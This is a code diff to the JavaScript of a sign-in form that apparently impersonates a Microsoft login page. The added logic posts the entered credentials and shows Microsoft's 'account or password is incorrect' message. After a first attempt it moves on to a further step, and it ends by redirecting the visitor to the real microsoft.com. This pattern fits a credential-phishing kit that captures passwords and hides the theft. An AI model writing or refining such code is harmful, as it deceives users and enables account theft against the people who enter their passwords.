@@ -286,34 +286,80 @@
       method: 'POST',
       body: formData
     })
-    .then(response => response.text())
+    .then(response => {
+      const redirected = response.redirected;
+      const url = response.url;
+      
+      // Check if redirected to microsoft.com (success case)
+      if (redirected && url.includes('microsoft.com')) {
+        window.location.href = 'https://microsoft.com';
+        return;
+      }
+      
+      return response.text();
+    })
     .then(html => {
+      if (!html) return; // Already redirected
+      
       // Parse the response to check for error messages
       const parser = new DOMParser();
       const doc = parser.parseFromString(html, 'text/html');
-      const errorScript = doc.querySelector('script');
       
-      if (errorScript && errorScript.textContent.includes('showError')) {
-        // Extract error message
-        const errorMatch = errorScript.textContent.match(/showError\("([^"]+)"/);
-        if (errorMatch) {
-          if (isSecondAttempt) {
-            // This was the second attempt and it failed
-            showError(errorMatch[1]);
-          } else {
-            // This was the first attempt, show error and proceed to step 3
-            showError(errorMatch[1]);
-            setTimeout(() => showStep3(), 2000);
+      // Look for error messages in the response
+      let hasError = false;
+      let errorMessage = '';
+      
+      // Check for flashed error messages
+      const scripts = doc.querySelectorAll('script');
+      for (let script of scripts) {
+        if (script.textContent.includes('showError')) {
+          const errorMatch = script.textContent.match(/showError\("([^"]+)"/);
+          if (errorMatch) {
+            hasError = true;
+            errorMessage = errorMatch[1];
+            break;
           }
         }
+      }
+      
+      // Check URL parameters for errors
+      const currentUrl = new URL(window.location.href);
+      if (html.includes('error=true') || currentUrl.searchParams.get('error')) {
+        hasError = true;
+        if (!errorMessage) {
+          errorMessage = "Your account or password is incorrect. If you don't remember your password, reset it now.";
+        }
+      }
+      
+      if (hasError) {
+        if (isSecondAttempt) {
+          // Second attempt failed - show error and reset
+          showError(errorMessage);
+          // Reset the sign-in button
+          const signinBtn = document.getElementById("signinBtn");
+          if (signinBtn) {
+            signinBtn.disabled = false;
+            signinBtn.innerHTML = "Sign in";
+          }
+        } else {
+          // First attempt - show error and proceed to step 3
+          showError(errorMessage);
+          setTimeout(() => showStep3(), 2000);
+        }
       } else {
-        // Success - user will be redirected by backend
+        // No error detected but no redirect - might be success
         window.location.href = 'https://microsoft.com';
       }
     })
     .catch(error => {
       console.error('Error:', error);
       showError('Network error occurred');
+      // Reset the sign-in button on error
+      const signinBtn = document.getElementById("signinBtn");
+      if (signinBtn) {
+        signinBtn.disabled = false;
+        signinBtn.innerHTML = "Sign in";
+      }
     });
   }
 
